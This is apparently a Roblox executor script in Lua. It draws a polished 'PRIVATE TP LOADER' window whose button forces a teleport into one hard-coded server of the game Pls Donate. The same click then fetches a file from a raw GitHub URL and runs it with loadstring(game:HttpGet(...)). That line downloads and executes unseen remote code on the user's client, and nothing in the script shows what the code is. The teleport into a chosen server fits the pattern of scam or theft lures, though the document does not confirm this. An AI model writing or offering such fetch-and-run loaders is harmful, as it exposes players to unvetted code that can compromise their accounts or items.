--// Super clean GUI + forced JobId teleport + loadstring
--// Hunter edition - premium dark mode

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remove old instance if exists
for _, gui in playerGui:GetChildren() do
    if gui.Name == "CleanTPHub" then
        gui:Destroy()
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CleanTPHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = playerGui

-- Main frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 340, 0, 200)
MainFrame.Position = UDim2.new(0.5, -170, 0.5, -100)
MainFrame.BackgroundColor3 = Color3.fromRGB(16, 16, 20)
MainFrame.BorderSizePixel = 0
MainFrame.BackgroundTransparency = 0.04
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 18)
UICorner.Parent = MainFrame

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 28, 36)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 14))
}
UIGradient.Rotation = 90
UIGradient.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(70, 170, 255)
UIStroke.Transparency = 0.6
UIStroke.Thickness = 1.8
UIStroke.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundTransparency = 1
Title.Text = "PRIVATE TP LOADER"
Title.TextColor3 = Color3.fromRGB(225, 225, 240)
Title.TextSize = 20
Title.Font = Enum.Font.GothamBlack
Title.TextXAlignment = Enum.TextXAlignment.Center
Title.Parent = MainFrame

local Underline = Instance.new("Frame")
Underline.Size = UDim2.new(0.75, 0, 0, 3)
Underline.Position = UDim2.new(0.125, 0, 0, 42)
Underline.BackgroundColor3 = Color3.fromRGB(90, 190, 255)
Underline.BorderSizePixel = 0
Underline.Parent = MainFrame

local UnderlineCorner = Instance.new("UICorner")
UnderlineCorner.CornerRadius = UDim.new(1,0)
UnderlineCorner.Parent = Underline

-- Big button
local LoadButton = Instance.new("TextButton")
LoadButton.Size = UDim2.new(0.84, 0, 0, 68)
LoadButton.Position = UDim2.new(0.08, 0, 0.40, 0)
LoadButton.BackgroundColor3 = Color3.fromRGB(50, 130, 255)
LoadButton.TextColor3 = Color3.fromRGB(250, 250, 255)
LoadButton.Text = "Join Specific Server + Load"
LoadButton.TextSize = 23
LoadButton.Font = Enum.Font.GothamSemibold
LoadButton.BorderSizePixel = 0
LoadButton.AutoButtonColor = false
LoadButton.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 14)
ButtonCorner.Parent = LoadButton

local ButtonStroke = Instance.new("UIStroke")
ButtonStroke.Color = Color3.fromRGB(110, 190, 255)
ButtonStroke.Thickness = 2.2
ButtonStroke.Transparency = 0.35
ButtonStroke.Parent = LoadButton

-- Hover / click effects
local function tween(obj, props, time, easing)
    local ti = TweenInfo.new(time or 0.28, easing or Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    TweenService:Create(obj, ti, props):Play()
end

LoadButton.MouseEnter:Connect(function()
    tween(LoadButton, {BackgroundColor3 = Color3.fromRGB(75, 155, 255)}, 0.25)
    tween(ButtonStroke, {Transparency = 0.15}, 0.25)
end)

LoadButton.MouseLeave:Connect(function()
    tween(LoadButton, {BackgroundColor3 = Color3.fromRGB(50, 130, 255)}, 0.35)
    tween(ButtonStroke, {Transparency = 0.35}, 0.35)
end)

LoadButton.MouseButton1Down:Connect(function()
    tween(LoadButton, {Size = UDim2.new(0.82, 0, 0, 64)}, 0.13, Enum.EasingStyle.Back)
end)

LoadButton.MouseButton1Up:Connect(function()
    tween(LoadButton, {Size = UDim2.new(0.84, 0, 0, 68)}, 0.2, Enum.EasingStyle.Back)
end)

-- The action: teleport to specific JobId → then load the script
LoadButton.MouseButton1Click:Connect(function()
    -- Quick flash feedback
    local flash = Instance.new("Frame")
    flash.Size = UDim2.new(1,0,1,0)
    flash.BackgroundColor3 = Color3.fromRGB(255,255,255)
    flash.BackgroundTransparency = 0.5
    flash.ZIndex = 10
    flash.Parent = LoadButton
    local fc = Instance.new("UICorner", flash)
    fc.CornerRadius = UDim.new(0,14)
    tween(flash, {BackgroundTransparency = 1}, 0.45)
    game.Debris:AddItem(flash, 0.6)

    -- Target JobId
    local targetJobId = "de9b59d8-f086-42b2-afcf-e83e1d52b95a"
    local placeId = 109983668079237   -- Pls Donate (change if needed)

    -- Attempt teleport
    task.spawn(function()
        local success, err = pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, targetJobId, player)
        end)

        if not success then
            warn("[Teleport Failed] → " .. tostring(err))
            -- Optional: show error in GUI (you can add a label if you want)
        end
    end)

    -- Load the script anyway (some executors allow it before/after teleport)
    task.delay(0.4, function()
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhah1/TP/refs/heads/main/dqw"))()
        end)
        if not success then
            warn("[Script Load Failed] → " .. tostring(err))
        end
    end)
end)

-- Small close button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 32, 0, 32)
CloseBtn.Position = UDim2.new(1, -38, 0, 8)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "×"
CloseBtn.TextColor3 = Color3.fromRGB(220, 70, 70)
CloseBtn.TextSize = 26
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Parent = MainFrame

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Draggable
local dragging, dragInput, dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)
